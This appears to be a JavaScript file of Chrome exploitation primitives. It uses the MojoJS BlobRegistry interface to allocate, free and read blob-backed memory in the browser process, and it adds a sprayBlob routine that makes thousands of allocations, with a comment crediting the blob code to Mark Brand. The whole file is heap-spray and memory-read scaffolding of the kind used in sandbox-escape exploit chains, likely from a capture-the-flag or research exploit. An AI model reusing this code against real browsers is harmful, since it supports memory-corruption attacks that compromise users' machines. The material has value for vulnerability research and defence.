function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
} // blob code taken from Mark Brand


let g_blob_keeper = [];

function getAllocationConstructor() {
  let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
  Mojo.bindInterface(blink.mojom.BlobRegistry.name, mojo.makeRequest(blob_registry_ptr).handle, "process", true);

  function Allocation(size) {
    function ProgressClient(allocate) {
      function ProgressClientImpl() {}

      ProgressClientImpl.prototype = {
        onProgress: async arg0 => {
          if (this.allocate.writePromise) {
            this.allocate.writePromise.resolve(arg0);
          }
        }
      };
      this.allocate = allocate;
      this.ptr = new mojo.AssociatedInterfacePtrInfo();
      var progress_client_req = mojo.makeRequest(this.ptr);
      this.binding = new mojo.AssociatedBinding(blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);
      return this;
    }

    this.pipe = Mojo.createDataPipe({
      elementNumBytes: size,
      capacityNumBytes: size
    });
    this.progressClient = new ProgressClient(this);
    blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then(res => {
      this.serialized_blob = res.blob;
    });

    this.malloc = async function (data) {
      promise = new Promise((resolve, reject) => {
        this.writePromise = {
          resolve: resolve,
          reject: reject
        };
      });
      this.pipe.producer.writeData(data);
      this.pipe.producer.close();
      written = await promise;
      console.assert(written == data.byteLength);
    };

    this.free = async function () {
      this.serialized_blob.blob.ptr.reset();
    };

    this.read = function (offset, length) {
      this.readpipe = Mojo.createDataPipe({
        elementNumBytes: 1,
        capacityNumBytes: length
      });
      this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
      return new Promise(resolve => {
        this.watcher = this.readpipe.consumer.watch({
          readable: true
        }, r => {
          result = new ArrayBuffer(length);
          this.readpipe.consumer.readData(result);
          this.watcher.cancel();
          resolve(result);
        });
      });
    };

    this.readQword = async function (offset) {
      let res = await this.read(offset, 8);
      return new DataView(res).getBigUint64(0, true);
    };

    return this;
  }

  async function allocate(data) {
    let allocation = new Allocation(data.byteLength);
    await allocation.malloc(data);
    g_blob_keeper.push(allocation);
    return allocation;
  }

  return allocate;
}

var g_allocate = getAllocationConstructor();

async function sprayBlob(data, num = 0x1000) {
  return Promise.all(Array(num).fill().map(() => g_allocate(data)));
}